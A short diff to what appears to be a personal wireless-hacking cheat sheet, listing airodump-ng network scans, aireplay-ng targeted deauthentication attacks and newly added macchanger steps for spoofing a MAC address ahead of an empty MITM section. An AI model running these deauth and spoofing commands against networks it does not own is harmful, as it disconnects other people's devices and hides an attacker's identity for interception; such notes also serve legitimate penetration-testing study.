@@ -7,3 +7,9 @@ airodump-ng wlan0mon SHOW NETWORKS
 airodump-ng --channel "number" --bssid "bssid" SHOW DEVICE CONNECTED TO A SPECIFIC NETWORK
 aireplay-ng --deauth "number of packets (0 to continously send)" -a "bssid" -c "mac address" wlan0mon TARGETED DEAUTH ATTACK
 aireplay-ng -0 "numberb of packets" -a "bssid" 
+=================mac changing==============
+ifconfig "interface" down TURN OFF NETWORK INTERFACE
+ifconfig "interface" up TURN ON NETWORK INTERCAFE
+machchanger -r "interface" RANDOM MAC ADDRESS
+macchanger -m "mac address" "interface" CHANGE TO SPECIFIC MAC ADDRESS
+=================MITM==================
